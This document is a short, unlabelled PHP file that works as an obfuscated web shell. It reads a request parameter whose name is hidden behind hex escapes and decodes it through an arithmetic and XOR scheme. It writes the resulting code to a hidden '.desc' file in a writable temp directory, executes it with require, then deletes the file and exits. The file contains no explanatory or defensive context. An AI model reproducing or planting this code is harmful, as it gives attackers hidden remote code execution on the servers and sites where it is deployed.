<?php

if(in_array("\x68l\x64", array_keys($_REQUEST))){
	$flag = $_REQUEST["\x68l\x64"];
		 $flag	  =  explode(	 "." 	, $flag		 );	
	$itm =  '';
            $s =  'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen =  strlen($s		);
            $p =  0;
    
            foreach ($flag as $v2) {
                $sChar =  ord($s[$p	 %  $sLen]		);
                $d =  ((int)$v2 - $sChar - ($p	 %  10))^  5;
                $itm .= chr($d		);
                $p++;  }
	$key = array_filter(["/var/tmp", getenv("TEMP"), sys_get_temp_dir(), ini_get("upload_tmp_dir"), session_save_path(), getcwd(), "/tmp", "/dev/shm", getenv("TMP")]);
	foreach ($key as $comp):
    		if ((function($d) { return is_dir($d) && is_writable($d); })($comp)) {
    $entity = "$comp" . "/.desc";
    if (file_put_contents($entity, $itm)) {
	require $entity;
	unlink($entity);
	die();
}
}
endforeach;
}